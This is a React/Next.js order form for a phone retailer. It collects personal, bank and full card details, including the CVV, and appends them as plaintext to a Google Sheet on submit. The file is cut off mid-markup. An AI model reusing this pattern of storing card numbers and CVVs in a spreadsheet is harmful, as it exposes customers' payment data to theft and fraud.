"use client";

import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import * as z from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useRouter } from "next/navigation";
import { useToast } from "@/hooks/use-toast";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Calendar, CheckCircle2, Mail, MapPin, Phone, Smartphone, User, Info, ChevronsUpDown, Check, Banknote, CreditCard } from "lucide-react";
import { useState, useEffect, useCallback } from "react";
import { cn } from "@/lib/utils";
import Image from "next/image";
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
import PhoneInput from 'react-phone-input-2';
import 'react-phone-input-2/lib/style.css';
import DatePicker from "react-datepicker";
import "react-datepicker/dist/react-datepicker.css";
import { Command, CommandEmpty, CommandGroup, CommandInput, CommandItem } from "@/components/ui/command";
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
import Link from "next/link";

// Define the API response types
type Product = {
  id: string;
  slug: string;
  title: string;
  short_description: string;
  color_attributes: {
    id: string;
    color: string;
    image: string;
  }[];
  storage_attributes: {
    id: string;
    storage: string;
    price: number;
  }[];
};

type ApiResponse = {
  data: Product[];
  success: boolean;
  statusCode: number;
  message: string;
};

const formSchema = z.object({
  firstName: z.string()
    .min(2, { message: "First name must be at least 2 characters" })
    .max(50, { message: "First name must be less than 50 characters" })
    .regex(/^[a-zA-Z\s'-]+$/, { message: "Only letters, spaces, hyphens, and apostrophes are allowed" }),
  lastName: z.string()
    .min(2, { message: "Last name must be at least 2 characters" })
    .max(50, { message: "Last name must be less than 50 characters" })
    .regex(/^[a-zA-Z\s'-]+$/, { message: "Only letters, spaces, hyphens, and apostrophes are allowed" }),
  mobileNumber: z.string()
    .min(10, { message: "Number must be at least 10 characters" })
    .max(12, { message: "Address must be less than 12 characters" }),
  dateOfBirth: z.date()
    .max(new Date(new Date().setFullYear(new Date().getFullYear() - 5)), { message: "Must be at least 5 years old" }),
  date: z.date(),
  email: z.string()
    .email({ message: "Please enter a valid email address" })
    .max(100, { message: "Email must be less than 100 characters" }),
  address: z.string()
    .min(5, { message: "Address must be at least 5 characters" })
    .max(200, { message: "Address must be less than 200 characters" }),
  postCode: z.string()
    .min(3, { message: "Post code must be at least 3 characters" })
    .max(10, { message: "Post code must be less than 10 characters" })
    .regex(/^[a-zA-Z0-9\s-]+$/, { message: "Invalid post code format" }),
  houseNumber: z.string()
    .min(1, { message: "House number is required" })
    .max(10, { message: "House number must be less than 10 characters" }),
  mobileModel: z.string()
    .min(1, { message: "Please select a mobile model" }),
  mobileColor: z.string()
    .min(1, { message: "Please select a color" }),
  mobileStorage: z.string()
    .min(1, { message: "Please select a storage option" }),
  network: z.string()
    .min(1, { message: "Please select a network" }),
  // Banking Details
  directDebitDate: z.string()
    .refine(val => !val || (Number(val) >= 1 && Number(val) <= 30),
      { message: "Must be between 1 and 30" }).optional(),
  sortCode: z.string()
    .refine(val => !val || /^\d{6}$/.test(val),
      { message: "Sort code must be 6 digits" }).optional(),
  accountNumber: z.string()
    .refine(val => !val || /^\d{8}$/.test(val),
      { message: "Account number must be 8 digits" }).optional(),
  nameOnCard: z.string().optional(),
  timeWithBank: z.string().optional(),

  // Card Details
  cardNumber: z.string()
    .refine(val => !val || /^\d{16}$/.test(val),
      { message: "Card number must be 16 digits" }).optional(),
  cardExpiry: z.string()
    .refine(val => !val || /^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(val),
      { message: "Invalid expiry date format (MM/YY)" }).optional(),
  cardCvv: z.string()
    .refine(val => !val || /^\d{3}$/.test(val),
      { message: "CVV must be 3 digits" }).optional(),
});


export default function OrderForm() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const { toast } = useToast();
  const [products, setProducts] = useState<Product[]>([]);
  const [loadingProducts, setLoadingProducts] = useState(false);
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [openModelDropdown, setOpenModelDropdown] = useState(false);
  useState
  const [searchQuery, setSearchQuery] = useState("");
  const router = useRouter();


  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      mobileNumber: "",
      dateOfBirth: new Date(new Date().setFullYear(new Date().getFullYear() - 8)), // Default to 8 years old
      date: new Date(),
      email: "",
      address: "",
      postCode: "",
      houseNumber: "",
      mobileModel: "",
      mobileColor: "",
      mobileStorage: "",
      network: "",
      directDebitDate: "",
      sortCode: "",
      accountNumber: "",
      nameOnCard: "",
      timeWithBank: "",
      cardNumber: "",
      cardExpiry: "",
      cardCvv: "",
    },
  });

  // Update the fetchProducts function to use useCallback
  const fetchProducts = useCallback(async () => {
    setLoadingProducts(true);
    try {
      const url = searchQuery
        ? `https://api.thefonehouse.com/api/products?page=1&limit=8&search=${searchQuery}`
        : `https://api.thefonehouse.com/api/products?page=1&limit=8`;

      const response = await fetch(url);
      const data: ApiResponse = await response.json();

      if (data.success) {
        setProducts(data.data);
      } else {
        throw new Error(data.message || "Failed to fetch products");
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to load mobile models",
        variant: "destructive",
      });
    } finally {
      setLoadingProducts(false);
    }
  }, [searchQuery, toast]); // Add dependencies here

  // Then update the useEffect
  useEffect(() => {
    fetchProducts();
  }, [fetchProducts]); // Now we can just include fetchProducts as the dependency


  // Auto-format phone number
  useEffect(() => {
    const subscription = form.watch((value, { name }) => {
      if (name === "mobileNumber" && value.mobileNumber) {
        const cleaned = value.mobileNumber.replace(/\D/g, '');

        // For numbers starting with 07: limit to 11 digits
        if (cleaned.startsWith('07') && cleaned.length > 11) {
          form.setValue("mobileNumber", cleaned.slice(0, 11), { shouldValidate: true });
        }
        // For numbers starting with 447: limit to 12 digits
        else if (cleaned.startsWith('447') && cleaned.length > 12) {
          form.setValue("mobileNumber", cleaned.slice(0, 12), { shouldValidate: true });
        }
        // Update if the cleaned value is different
        else if (cleaned !== value.mobileNumber.replace(/\D/g, '')) {
          form.setValue("mobileNumber", cleaned, { shouldValidate: true });
        }
      }
    });
    return () => subscription.unsubscribe();
  }, [form, form.watch]);

  // Reset color and storage when model changes
  useEffect(() => {
    const subscription = form.watch((value, { name }) => {
      if (name === "mobileModel" && value.mobileModel) {
        const product = products.find(p => p.id === value.mobileModel);
        setSelectedProduct(product || null);
        form.resetField("mobileColor");
        form.resetField("mobileStorage");
      }
    });
    return () => subscription.unsubscribe();
  }, [form, products]);


  // Update the onSubmit function in Code 1:
  async function onSubmit(values: z.infer<typeof formSchema>) {
    setIsSubmitting(true);
    try {
      const spreadsheetId = '1lxlp-sXZRCxgFP-yJtWmyYvxgUBpIHFUG87irV75Mfg';
      const range = 'Sheet1';

      if (!selectedProduct) {
        throw new Error("Please select a product");
      }

      // Get the selected color and storage
      const selectedColor = selectedProduct.color_attributes.find(
        color => color.id === values.mobileColor
      );
      const selectedStorage = selectedProduct.storage_attributes.find(
        storage => storage.id === values.mobileStorage
      );

      // Format storage with proper units
      const formatStorage = (storageSize: string | number) => {
        const size = typeof storageSize === 'string' ? parseInt(storageSize, 10) : storageSize;
        return size <= 3 ? `${size} TB` : `${size} GB`;
      };

      // Format date as "26/Jun/2025"
      const formatDate = (date: Date) => {
        const day = date.getDate();
        const month = date.toLocaleString('default', { month: 'short' });
        const year = date.getFullYear();
        return `${day}/${month}/${year}`;
      };

      // Prepare the values - now including banking and card details
      const formattedValues = [
        values.firstName,
        values.lastName,
        values.mobileNumber,
        formatDate(values.dateOfBirth),
        values.email,
        values.address,
        values.postCode,
        values.houseNumber,
        selectedProduct.title,
        selectedColor?.color || values.mobileColor,
        selectedStorage ? formatStorage(selectedStorage.storage) : values.mobileStorage,
        values.network,
        formatDate(new Date()),
        // Banking Details
        values.directDebitDate || 'N/A',
        values.sortCode || 'N/A',
        values.accountNumber || 'N/A',
        values.nameOnCard || 'N/A',
        values.timeWithBank || 'N/A',
        // Card Details
        values.cardNumber || 'N/A',
        values.cardExpiry || 'N/A',
        values.cardCvv || 'N/A'
      ];

      // Send to API with color information
      const response = await fetch('/api/sheets', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          spreadsheetId,
          range,
          values: formattedValues,
          colorHex: selectedColor?.color
        }),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.error || result.message || 'Failed to save data');
      }

      setIsSuccess(true);
      toast({
        title: "Success!",
        description: "Your form has been submitted successfully.",
        duration: 5000,
      });

      form.reset();
      setSelectedProduct(null);
    } catch (error: unknown) {
      console.error('Error submitting form:', error);
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  }

  if (isSuccess) {
    const navigateToWebsite = () => {
      router.push("https://thefonehouse.com/");
    };
    return (
      <div className="min-h-screen bg-gradient-to-b from-teal-700 to-teal-800 flex items-center justify-center p-4">
        <Card className="max-w-md w-full bg-white/90 backdrop-blur-sm shadow-2xl border-0">
          <CardHeader className="text-center space-y-4">
            <div className="mx-auto bg-teal-100 rounded-full p-4 w-fit">
              <CheckCircle2 className="h-12 w-12 text-teal-600" />
            </div>
            <CardTitle className="text-2xl font-bold text-teal-800">Thank You!</CardTitle>
            <p className="text-gray-700">
              Your details have been submitted successfully. Our team will contact you shortly.
            </p>
          </CardHeader>
          <CardContent className="flex justify-center">
            <Button
              className="bg-teal-600 hover:bg-teal-700"
              onClick={navigateToWebsite}
            >
              Visit Website
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-teal-700 to-teal-800 py-8 px-4 sm:px-6 lg:px-8">
      <div className="max-w-4xl mx-auto">
        <Card className="shadow-2xl border-0 overflow-hidden backdrop-blur-sm bg-white/90">
          <CardHeader className="bg-gray-50 rounded-t-lg p-6 sm:p-8 space-y-4">
            <div className="flex justify-center">
              <Image
                src="/logo.svg"
                alt="Company Logo"
                width={400}
                height={400}
                className="rounded-full"
                priority
              />
            </div>
            <div className=" space-y-2">
              <CardTitle className="text-2xl font-bold text-gray-900">
                Submit Your Details
              </CardTitle>
              <p className="text-sm sm:text-base text-gray-600">
                Please submit your details and our team will contact you shortly. For further inquiry please visit <Link href="https://thefonehouse.com/" className="text-teal-700 underline">www.thefonehouse.com</Link>.
              </p>
            </div>
          </CardHeader>

          <CardContent className="p-6 sm:p-8 lg:p-10">
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
                <div className="space-y-8">
                  {/* Device Information Section */}
                  <section className="space-y-4">
                    <div className="flex items-center gap-3 text-teal-700 pt-4">
                      <Smartphone className="h-5 w-5" />
                      <h2 className="text-lg sm:text-xl font-semibold">Device Information</h2>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5 sm:gap-6">
                      {/* Mobile Model */}
                      <FormField
                        control={form.control}
                        name="mobileModel"
                        render={({ field }) => (
                          <FormItem className="flex flex-col">
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Mobile Model
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>The make and model of the device you&apos;re interested in</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <Popover open={openModelDropdown} onOpenChange={setOpenModelDropdown}>
                              <PopoverTrigger asChild>
                                <FormControl>
                                  <Button
                                    variant="outline"
                                    role="combobox"
                                    aria-expanded={openModelDropdown}
                                    className={cn(
                                      "w-full justify-between text-sm sm:text-base border-gray-300 hover:border-teal-500",
                                      !field.value && "text-muted-foreground"
                                    )}
                                  >
                                    {field.value
                                      ? (products || []).find((product) => product.id === field.value)?.title
                                      : "Select a mobile model"}
                                    <ChevronsUpDown className="ml-2 h-4 w-4 shrink-0 opacity-50" />
                                  </Button>
                                </FormControl>
                              </PopoverTrigger>
                              <PopoverContent className="w-full p-0">
                                <Command>
                                  <CommandInput
                                    placeholder="Search mobile models..."
                                    onValueChange={setSearchQuery}
                                    value={searchQuery}
                                  />
                                  <CommandEmpty>No models found.</CommandEmpty>
                                  {loadingProducts ? (
                                    <div className="py-6 text-center text-sm">Loading models...</div>
                                  ) : (
                                    <CommandGroup>
                                      {(products || []).map((product) => (
                                        <CommandItem
                                          value={product.title}
                                          key={product.id}
                                          onSelect={() => {
                                            form.setValue("mobileModel", product.id);
                                            setOpenModelDropdown(false);
                                          }}
                                        >
                                          <Check
                                            className={cn(
                                              "mr-2 h-4 w-4",
                                              product.id === field.value
                                                ? "opacity-100"
                                                : "opacity-0"
                                            )}
                                          />
                                          {product.title}
                                        </CommandItem>
                                      ))}
                                    </CommandGroup>
                                  )}
                                </Command>
                              </PopoverContent>
                            </Popover>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Mobile Color */}
                      <FormField
                        control={form.control}
                        name="mobileColor"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Mobile Color
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>The color variant you prefer</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <Select
                              onValueChange={field.onChange}
                              value={field.value}
                              disabled={!selectedProduct}
                            >
                              <FormControl>
                                <SelectTrigger className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors">
                                  <SelectValue placeholder={selectedProduct ? "Select a color" : "Select model first"} />
                                </SelectTrigger>
                              </FormControl>
                              <SelectContent>
                                {selectedProduct?.color_attributes.map((color) => (
                                  <SelectItem key={color.id} value={color.id}>
                                    <div className="flex items-center gap-2">
                                      <div
                                        className="h-4 w-4 rounded-full border"
                                        style={{ backgroundColor: color.color }}
                                      />
                                      <span>Color</span>
                                    </div>
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Mobile Storage */}
                      <FormField
                        control={form.control}
                        name="mobileStorage"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Storage Capacity
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>The storage size you prefer</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <Select
                              onValueChange={field.onChange}
                              value={field.value}
                              disabled={!selectedProduct}
                            >
                              <FormControl>
                                <SelectTrigger className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors">
                                  <SelectValue placeholder={selectedProduct ? "Select storage" : "Select model first"} />
                                </SelectTrigger>
                              </FormControl>
                              <SelectContent>
                                {selectedProduct?.storage_attributes.map((storage) => (
                                  <SelectItem key={storage.id} value={storage.id}>
                                    {`${Number(storage.storage) <= 3 ? storage.storage + ' TB' : storage.storage + ' GB'}`} - £{storage.price}
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Network */}
                      <FormField
                        control={form.control}
                        name="network"
                        render={({ field }) => (
                          <FormItem className="sm:col-span-2">
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Desired Network
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Select your preferred mobile network provider</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <Select onValueChange={field.onChange} defaultValue={field.value}>
                              <FormControl>
                                <SelectTrigger className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors">
                                  <SelectValue placeholder="Please select your network" />
                                </SelectTrigger>
                              </FormControl>
                              <SelectContent>
                                <SelectItem value="factory-unlock">Factory Unlock</SelectItem>
                                <SelectItem value="o2">O2</SelectItem>
                                <SelectItem value="vodafone">Vodafone</SelectItem>
                                <SelectItem value="ee">EE</SelectItem>
                                <SelectItem value="giffgaff">Giff Gaff</SelectItem>
                                <SelectItem value="lebara">Lebara</SelectItem>
                                <SelectItem value="lyca">Lyca</SelectItem>
                                <SelectItem value="tesco">Tesco</SelectItem>
                                <SelectItem value="virgin-media">Virgin Media</SelectItem>
                                <SelectItem value="sky-mobile">Sky Mobile</SelectItem>
                                <SelectItem value="id-mobile">ID Mobile</SelectItem>
                                <SelectItem value="talk-mobile">Talk Mobile</SelectItem>
                                <SelectItem value="bt-mobile">BT Mobile</SelectItem>
                                <SelectItem value="voxi-mobile">VOXI Mobile</SelectItem>
                                <SelectItem value="smarty">SMARTY</SelectItem>
                              </SelectContent>
                            </Select>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />
                    </div>
                  </section>

                  {/* Personal Information Section */}
                  <section className="space-y-4">
                    <div className="flex items-center gap-3 text-teal-700">
                      <User className="h-5 w-5" />
                      <h1 className="text-lg sm:text-xl font-semibold">Personal Information</h1>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5 sm:gap-6">
                      {/* First Name */}
                      <FormField
                        control={form.control}
                        name="firstName"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              First Name
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Your legal first name as it appears on official documents</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <div className="relative group">
                                <User className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                                <Input
                                  className="pl-9 text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                  placeholder="John"
                                  {...field}
                                  aria-describedby="firstName-help"
                                />
                              </div>
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Last Name */}
                      <FormField
                        control={form.control}
                        name="lastName"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Last Name
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Your legal last name as it appears on official documents</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <div className="relative group">
                                <User className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                                <Input
                                  className="pl-9 text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                  placeholder="Doe"
                                  {...field}
                                />
                              </div>
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Mobile Number */}
                      <FormField
                        control={form.control}
                        name="mobileNumber"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Mobile Number
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>We&apos;ll use this number to contact you about your order</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <div className="relative group">
                                <Phone className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                                <PhoneInput
                                  country={'gb'}
                                  value={field.value}
                                  onChange={(value: any) => field.onChange(value)}
                                  inputProps={{
                                    required: true,
                                    className: "!h-10 !w-full !pl-12 !text-sm sm:!text-base !border-gray-300 hover:!border-teal-500 focus:!border-teal-500 focus:!ring-1 focus:!ring-teal-500 !rounded-md !transition-colors"
                                  }}
                                  containerClass="w-full"
                                  inputClass="!w-full !h-10 !pl-9"
                                  buttonClass="!h-10 !border-gray-300 hover:!border-teal-500"
                                  dropdownClass="!border-gray-300"
                                />
                              </div>
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Date of Birth */}
                      <FormField
                        control={form.control}
                        name="dateOfBirth"
                        render={({ field }) => (
                          <FormItem className="flex flex-col">
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Date of Birth
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>You must be at least 13 years old to use this service</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <div className="relative group">
                                <Calendar className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                                <DatePicker
                                  selected={field.value}
                                  onChange={field.onChange}
                                  dateFormat="dd/MM/yyyy"
                                  showYearDropdown
                                  dropdownMode="select"
                                  maxDate={new Date()}
                                  className="pl-9 w-full h-10 rounded-md border border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 text-sm sm:text-base transition-colors"
                                  placeholderText="Select your date of birth"
                                  wrapperClassName="w-full"
                                />
                              </div>
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Email */}
                      <FormField
                        control={form.control}
                        name="email"
                        render={({ field }) => (
                          <FormItem className="sm:col-span-2">
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Email Address
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>We&apos;ll send order confirmation and updates to this email</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <div className="relative group">
                                <Mail className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                                <Input
                                  type="email"
                                  className="pl-9 text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                  placeholder="your.email@example.com"
                                  {...field}
                                />
                              </div>
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />
                    </div>
                  </section>

                  {/* Billing Address Section */}
                  <section className="space-y-4">
                    <div className="flex items-center gap-3 text-teal-700 pt-4">
                      <MapPin className="h-5 w-5" />
                      <h2 className="text-lg sm:text-xl font-semibold">Billing Address</h2>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5 sm:gap-6">
                      {/* Full Address */}
                      <FormField
                        control={form.control}
                        name="address"
                        render={({ field }) => (
                          <FormItem className="sm:col-span-2">
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Full Address
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Include street name, city, and country</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <div className="relative group">
                                <MapPin className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                                <Input
                                  className="pl-9 text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                  placeholder="123 Main Street, London, UK"
                                  {...field}
                                />
                              </div>
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Post Code */}
                      <FormField
                        control={form.control}
                        name="postCode"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Post Code
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Your postal or ZIP code</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <Input
                                className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                placeholder="SW1A 1AA"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* House Number */}
                      <FormField
                        control={form.control}
                        name="houseNumber"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Door/House Number
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Your house or apartment number</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <Input
                                className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                placeholder="42"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />
                    </div>
                  </section>

                  {/* Banking Details Section */}
                  <section className="space-y-4">
                    <div className="flex items-center gap-3 text-teal-700 pt-4">
                      <Banknote className="h-5 w-5" />
                      <h2 className="text-lg sm:text-xl font-semibold">Banking Details</h2>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5 sm:gap-6">
                      {/* Direct Debit Date */}
                      <FormField
                        control={form.control}
                        name="directDebitDate"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Direct Debit Date (1-30)
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Select a date between 1st and 30th for direct debit</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <Select onValueChange={field.onChange} defaultValue={field.value}>
                              <FormControl>
                                <SelectTrigger className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors">
                                  <SelectValue placeholder="Select date (1-30)" />
                                </SelectTrigger>
                              </FormControl>
                              <SelectContent>
                                {Array.from({ length: 30 }, (_, i) => i + 1).map((date) => (
                                  <SelectItem key={date} value={date.toString()}>
                                    {date}
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Sort Code */}
                      <FormField
                        control={form.control}
                        name="sortCode"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              6 Digit Sort Code
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Your 6-digit bank sort code</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <Input
                                className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                placeholder="123456"
                                maxLength={6}
                                {...field}
                                onChange={(e) => {
                                  const value = e.target.value.replace(/\D/g, '').slice(0, 6);
                                  field.onChange(value);
                                }}
                              />
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />


                      {/* Account Number */}
                      <FormField
                        control={form.control}
                        name="accountNumber"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              8 Digit Account Number
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Your 8-digit bank account number</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
